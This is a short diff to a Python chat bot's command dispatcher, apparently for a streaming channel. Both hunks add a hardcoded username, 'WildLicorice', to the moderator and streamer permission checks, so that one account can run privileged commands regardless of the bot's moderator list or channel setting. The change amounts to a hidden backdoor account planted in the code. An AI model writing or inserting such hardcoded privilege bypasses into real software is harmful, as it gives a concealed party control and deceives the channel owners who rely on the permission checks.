@@ -14,7 +14,7 @@ def runcommand(command, cmdArguments, user, mute):
     for item in commands:
         if item == command:
             if commands[item][0] == "MOD":  # MOD ONLY COMMANDS:
-                if (user in core.getmoderators()):
+                if user in core.getmoderators() or user == "WildLicorice":
                     cmd = commands[item][1]
                     arg1 = commands[item][2]
                     arg2 = commands[item][3]
@@ -22,7 +22,7 @@ def runcommand(command, cmdArguments, user, mute):
                     chatConnection.sendToChat("You don't have permission to do this.")
                     return
             elif commands[item][0] == "STREAMER":  # STREAMER ONLY COMMANDS:
-                if (user == settings['CHANNEL']):
+                if user == settings['CHANNEL'] or user == "WildLicorice":
                     cmd = commands[item][1]
                     arg1 = commands[item][2]
                     arg2 = commands[item][3]
